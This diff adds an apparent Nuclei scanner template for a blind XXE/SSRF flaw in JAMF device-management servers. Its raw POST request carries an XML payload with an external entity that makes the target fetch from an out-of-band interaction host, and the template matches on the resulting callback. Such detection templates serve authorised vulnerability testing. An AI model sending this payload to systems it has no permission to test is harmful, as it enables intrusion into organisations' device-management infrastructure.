@@ -1,0 +1,35 @@
+http:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  - type: word
+    words:
+    - com.jamfsoftware.jss
+  matchers-condition: and
+  raw:
+  - "POST /client HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n\
+    <?xml version='1.0' encoding='UTF-8' standalone=\"no\"?>\n<!DOCTYPE jamfMessage\
+    \ SYSTEM \"http://{{interactsh-url}}/test.xml\">\n<ns2:jamfMessage xmlns:ns3=\"\
+    http://www.jamfsoftware.com/JAMFCommunicationSettings\" xmlns:ns2=\"http://www.jamfsoftware.com/JAMFMessage\"\
+    >\n  <device>\n    <uuid>&test;</uuid>\n    <macAddresses />\n  </device>\n  <application>com.jamfsoftware.jamfdistributionserver</application>\n\
+    \  <messageTimestamp>{{unix_time()}}</messageTimestamp>\n  <content xmlns:xsi=\"\
+    http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"ns2:ResponseContent\">\n\
+    \    <uuid>00000000-0000-0000-0000-000000000000</uuid>\n    <commandType>com.jamfsoftware.jamf.distributionserverinventoryrequest</commandType>\n\
+    \    <status>\n      <code>1999</code>\n      <timestamp>{{unix_time()}}</timestamp>\n\
+    \    </status>\n    <commandData>\n      <distributionServerInventory>\n     \
+    \   <ns2:distributionServerID>34</ns2:distributionServerID>\n      </distributionServerInventory>\n\
+    \    </commandData>\n  </content>\n</ns2:jamfMessage>\n"
+id: jamf-blind-xxe
+info:
+  author: pdteam
+  description: Blind XXE / SSRF exists in JAMF which is a company that provides enterprise-level
+    software solutions for managing and securing Apple devices in organizations.
+  metadata:
+    max-request: 1
+  name: JAMF Blind XXE / SSRF
+  reference:
+  - https://www.synack.com/blog/a-deep-dive-into-xxe-injection/
+  severity: medium
+  tags: xxe,ssrf,jamf
